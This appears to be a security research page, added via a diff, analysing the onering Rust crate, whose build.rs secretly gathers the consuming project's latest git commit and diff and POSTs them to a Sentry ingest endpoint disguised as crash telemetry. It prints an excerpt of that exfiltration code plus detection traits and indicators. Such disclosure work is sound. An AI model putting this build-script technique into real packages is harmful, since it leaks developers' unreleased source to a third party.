@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>onering: a crate that leaks unreleased source - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="onering: a crate that leaks unreleased source - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>onering: a crate that leaks unreleased source</h1>
+    <span class="post-meta">2026-06-10 &middot; crates.io &middot; onering</span>
+  </div>
+  <div class="post-body discovery-body">
+    <img src="/assets/images/onering-source-leak.jpg" alt="Meme: the Flex Tape leak gag — a sawn-open tank labeled SOFTWARE SUPPLYCHAIN gushing water, and a hand labeled POST-PUBLISH SCANNING slapping the hole shut; onering's build.rs is the leak, caught only after it shipped." style="width: 60%; height: auto;">
+<p><code>onering</code> is a real, useful crate — a high-throughput LMAX-Disruptor-style queue, some 2,776 lines of genuine library code credited to its actual author — and every file of it is honest except the one <code>cargo</code> runs before any of it compiles: <code>build.rs</code>.</p>
+<h2 id="build.rs-posts-your-git-diff-to-sentry" tabindex="-1"><a class="header-anchor" href="#build.rs-posts-your-git-diff-to-sentry"><span><a href="http://build.rs">build.rs</a> POSTs your git diff to Sentry</span></a></h2>
+<p>At build time — before a line of the library compiles — the script shells out to git for the latest commit's author and email, then for that commit's full diff: the developer's newest, often-unpublished source changes. It packs both into a Sentry envelope and posts them to an ingest endpoint hard-coded in the source, so to a network monitor and to Sentry's own servers the leak is indistinguishable from a Rust app reporting a crash — traffic that is rarely inspected and almost never blocked. The cleverer half is <em>where</em> it runs: the build script reads cargo's <code>OUT_DIR</code> and walks up past the <code>target/</code> directory into its parent, landing not in onering's own tree but in the consuming project's repo — so it harvests the victim developer's unreleased commit, not the library's.</p>
+<pre class="lang-js"><code><span class="tok-com">// build.rs — cargo runs this before a single line of the library compiles</span>
+<span class="tok-kw">let</span> <span class="tok-builtin">Ok</span>(commit) = <span class="tok-fn">git</span>(&amp;project_path, &amp;[<span class="tok-str">"log"</span>, <span class="tok-str">"-n"</span>, <span class="tok-str">"1"</span>,
+    <span class="tok-str">r#"--pretty=format:{"commit":"%H","author":"%an","email":"%ae",...}"#</span>]) <span class="tok-kw">else</span> { <span class="tok-kw">return</span> };
+<span class="tok-kw">let</span> <span class="tok-builtin">Ok</span>(patch) = <span class="tok-fn">git</span>(&amp;project_path, &amp;[<span class="tok-str">"diff"</span>, <span class="tok-str">"HEAD^"</span>, <span class="tok-str">"HEAD"</span>]) <span class="tok-kw">else</span> { <span class="tok-kw">return</span> };   <span class="tok-com">// HEAD^ errors on a 1-commit repo → silent bail</span>
+
+<span class="tok-kw">let</span> payload = <span class="tok-fn">format!</span>(<span class="tok-str">r#"{{"event_id":"{}","dsn":"https://8197…@o4511…ingest.de.sentry.io/4511…"}}</span>
+<span class="tok-str">{{"type":"event"}}</span>
+<span class="tok-str">{{"message":"on build","level":"info","platform":"rust","tags":{commit},"extra":{{"patch":"{}"}}}}"#</span>,
+    <span class="tok-builtin">Uuid</span>::<span class="tok-fn">new_v4</span>().<span class="tok-fn">as_simple</span>(), patch.<span class="tok-fn">replace</span>(<span class="tok-str">'"'</span>, <span class="tok-str">"\\\""</span>).<span class="tok-fn">replace</span>(<span class="tok-str">'\n'</span>, <span class="tok-str">"\\n"</span>));
+
+<span class="tok-kw">let</span> <span class="tok-builtin">Ok</span>(_) = <span class="tok-fn">request</span>(<span class="tok-str">"POST"</span>, <span class="tok-str">"https://o4511…ingest.de.sentry.io/api/4511…/envelope/"</span>,
+    &amp;[<span class="tok-str">"Content-Type: application/x-sentry-envelope"</span>], &amp;payload) <span class="tok-kw">else</span> { <span class="tok-kw">return</span> };   <span class="tok-com">// request() = curl subprocess</span>
+</code></pre>
+<p>Every step bails silently on error, and the diff itself is one such failure: a repo with a single commit has no <code>HEAD^</code>, so the leak does nothing there and fires only against projects with history worth taking.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>File</th>
+<th>Trait</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>build.rs</code></td>
+<td><code>objectives/supply-chain/recon-exfil/install-hook</code></td>
+<td>Assembles a Sentry envelope from <code>git log</code> + <code>git diff HEAD^ HEAD</code> and POSTs it</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>build.rs</code></td>
+<td><code>objectives/supply-chain/install-hook/build/behavioral</code></td>
+<td>Build script reads the environment and POSTs the payload outbound via curl</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>build.rs</code></td>
+<td><code>micro-behaviors/process/create/direct</code></td>
+<td>Spawns <code>git</code> and <code>curl</code> subprocesses via <code>Command::new</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>build.rs</code></td>
+<td><code>micro-behaviors/os/env/access</code></td>
+<td>Reads <code>OUT_DIR</code> to walk up into the consuming repo</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>build.rs</code></td>
+<td><code>micro-behaviors/communications/http/download/curl</code></td>
+<td><code>Command::new(&quot;curl&quot;)</code> POSTs to <code>ingest.de.sentry.io</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="package-metadata" tabindex="-1"><a class="header-anchor" href="#package-metadata"><span>Package metadata</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>name</td>
+<td><code>onering</code></td>
+</tr>
+<tr>
+<td>version</td>
+<td><code>1.4.1</code></td>
+</tr>
+<tr>
+<td>authors</td>
+<td><code>Laurent Wouters &lt;lwouters@cenotelie.fr&gt;</code></td>
+</tr>
+<tr>
+<td>description</td>
+<td><code>High throughput synchronous queue</code></td>
+</tr>
+<tr>
+<td>license</td>
+<td><code>MIT</code></td>
+</tr>
+<tr>
+<td>edition</td>
+<td><code>2024</code></td>
+</tr>
+<tr>
+<td>build</td>
+<td><code>build.rs</code></td>
+</tr>
+<tr>
+<td>repository</td>
+<td><code>https://github.com/cenotelie/onering</code></td>
+</tr>
+</tbody>
+</table>
+<p>The library keeps its promise of high throughput; the build script keeps a copy of your unreleased source and ships it to a stranger, dressed as a crash report — precious.</p>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Crate</td>
+<td><code>onering-1.4.1.crate</code></td>
+</tr>
+<tr>
+<td>Crate SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/bf1a59c082131ee826cda6c5c2a50857286f8dbb5f9851c368d1117d558ad41e"><code>bf1a59c082131ee826cda6c5c2a50857286f8dbb5f9851c368d1117d558ad41e</code></a></td>
+</tr>
+<tr>
+<td><code>build.rs</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/d46497217da839e05b88c745b655ccaa49e0bdd45e2b706d132711c79fb38c28"><code>d46497217da839e05b88c745b655ccaa49e0bdd45e2b706d132711c79fb38c28</code></a></td>
+</tr>
+<tr>
+<td>Sentry DSN</td>
+<td><code>https://8197ee42c4f59c83f4cc6d48f5bae821@o4511539639222272.ingest.de.sentry.io/4511539669368912</code></td>
+</tr>
+<tr>
+<td>Exfil endpoint</td>
+<td><code>https://o4511539639222272.ingest.de.sentry.io/api/4511539669368912/envelope/</code></td>
+</tr>
+</tbody>
+</table>
+<p><em>Independently reported first by Charlie Eriksen: <a href="https://github.com/cenotelie/onering/issues/1">cenotelie/onering#1</a> pins the <code>build.rs</code> to commit 45e552f and remains open with no maintainer reply.</em></p>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
